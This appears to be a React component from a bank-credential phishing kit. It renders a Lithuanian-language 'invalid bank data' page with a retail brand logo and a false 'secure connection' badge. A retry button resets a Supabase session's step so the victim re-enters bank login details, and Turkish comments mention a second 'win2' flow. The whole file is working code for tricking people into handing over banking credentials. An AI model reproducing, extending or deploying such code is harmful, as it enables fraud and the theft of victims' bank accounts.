"use client";

import { useEffect, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { Banken2Client } from "@/app/banken2/banken2-client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

export function InvalidBankClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [isWin2, setIsWin2] = useState<boolean | null>(null);

  useEffect(() => {
    if (!sessionId) { setIsWin2(false); return; }
    const supabase = createBrowserSupabaseClient();
    if (!supabase) { setIsWin2(false); return; }
    let cancelled = false;
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const fd = (data?.form_data ?? {}) as Record<string, any>;
      setIsWin2(fd.is_win2_flow === true);
    })();
    return () => { cancelled = true; };
  }, [sessionId]);

  // Zorlu/win2 akisi: hatali bankada da ayni banka-listesi tasarimi
  if (isWin2) {
    return <Banken2Client sessionId={sessionId} routeSessionId={routeSessionId ?? sessionId} invalid />;
  }
  if (isWin2 === null && sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
      </div>
    );
  }

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    const qs = sessionId ? `?session=${encodeURIComponent(sessionId)}` : "";
    window.location.href = `/banken${qs}`;
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <main className="relative z-10 flex w-full flex-col items-center justify-center p-0">
        {!sessionId ? (
          <div className="flex w-full justify-center">
            <p className="w-full max-w-sm rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400 shadow-sm">
              Neteisinga nuoroda.
            </p>
          </div>
        ) : (
          <div className="pak-form-card fade-in mx-auto w-full max-w-[720px]">
            <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-8 sm:pb-8 sm:pt-8">
              <div className="mx-auto flex w-full max-w-[520px] items-start justify-between gap-3">
                <div>
                  <h2 className="pak-form-title max-w-[11ch]">Neteisingi banko duomenys</h2>
                  <p className="pak-form-subtitle mt-2.5 max-w-[31rem]">
                    Įvestų banko duomenų nepavyko patikrinti. Patikrinkite duomenis ir bandykite dar kartą.
                  </p>
                </div>
                <img
                  src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="mx-auto mt-5 flex w-full max-w-[520px] flex-col items-center rounded-[24px] border border-[#4ade80]/30 bg-[radial-gradient(circle_at_top,rgba(74,222,128,0.16),transparent_55%),linear-gradient(180deg,rgba(8,24,14,0.96),rgba(5,12,8,0.98))] px-5 py-6 text-center shadow-[inset_0_1px_0_rgba(74,222,128,0.08)] sm:px-6 sm:py-7">
                <div className="relative mb-4 flex h-20 w-20 items-center justify-center sm:h-24 sm:w-24">
                  <div className="absolute inset-0 rounded-full border border-[#4ade80]/20" />
                  <div className="absolute inset-[10px] rounded-full border border-[#0fae4e]/20" />
                  <div className="absolute inset-[16px] rounded-full bg-[#0fae4e]/10 blur-md" />
                  <div className="rounded-full border border-[#4ade80]/30 bg-[#0fae4e]/10 p-3 sm:p-4">
                    <svg className="h-8 w-8 text-[#4ade80] sm:h-10 sm:w-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                  </div>
                </div>

                <p className="mb-6 max-w-[31rem] text-sm font-medium leading-6 text-white/82 sm:text-[0.95rem]">
                  Grįžkite į bankų sąrašą ir įveskite duomenis iš naujo. Įsitikinkite, kad prisijungimo duomenys tiksliai atitinka jūsų banką.
                </p>

                <button
                  onClick={() => void handleRetry()}
                  className="pak-form-button min-h-[3.65rem] w-full max-w-[22rem] px-6 text-lg"
                >
                  Bandyti dar kartą
                </button>

                <div className="mt-5 pak-form-security justify-center text-center">
                  <svg className="h-8 w-8 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>Saugus ryšys išlieka aktyvus</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
